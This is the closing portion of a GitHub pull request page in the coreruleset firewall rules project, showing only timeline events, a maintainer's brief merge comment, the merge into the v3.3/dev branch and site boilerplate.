[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=40&u=ccc452a3b0be733012c25f5dece1be2677b592e9&v=4)](/theMiddleBlue)
[theMiddleBlue](/theMiddleBlue)
removed
the
[üëÄ Needs action](/coreruleset/coreruleset/labels/%3Aeyes%3A%20Needs%20action)
label
[Oct 19, 2020](#event-3892551118)

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=40&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)
[dune73](/dune73)
mentioned this pull request
[Nov 2, 2020](#ref-issue-734655542)

[Monthly Chat Agendas November (2020-11-02 and 2020-11-16)
#1916](/coreruleset/coreruleset/issues/1916)

Closed

[![@franbuehler](https://avatars.githubusercontent.com/u/17731925?s=40&v=4)](/franbuehler)
[franbuehler](/franbuehler)
mentioned this pull request
[Dec 5, 2020](#ref-issue-757719607)

[Monthly Chat Agendas December (2020-12-07 and 2020-12-21)
#1944](/coreruleset/coreruleset/issues/1944)

Closed

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=80&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)

Copy link

Member

### **[dune73](/dune73)** commented [Dec 7, 2020](#issuecomment-739833399)

| This was supposed to be merged after the November meeting. Time to do this. Thank you [@theMiddleBlue](https://github.com/theMiddleBlue). |
| --- |

 üëç
1
 theMiddleBlue reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=40&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)
[dune73](/dune73)
merged commit [`874d81c`](/coreruleset/coreruleset/commit/874d81c8d70b6ff81286fa4f409c744aa09f44b7)
into
coreruleset:v3.3/dev

[Dec 7, 2020](https://github.com/coreruleset/coreruleset/pull/1793#event-4078935102)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fcoreruleset%2Fcoreruleset%2Fpull%2F1793)

Reviewers

No reviews

Assignees

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=40&v=4)](/theMiddleBlue) [theMiddleBlue](/theMiddleBlue)

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

4 participants

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=52&v=4)](/theMiddleBlue) [![@Taiki-San](https://avatars.githubusercontent.com/u/731787?s=52&v=4)](/Taiki-San) [![@dune73](https://avatars.githubusercontent.com/u/618722?s=52&v=4)](/dune73) [![@lifeforms](https://avatars.githubusercontent.com/u/3464056?s=52&v=4)](/lifeforms)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


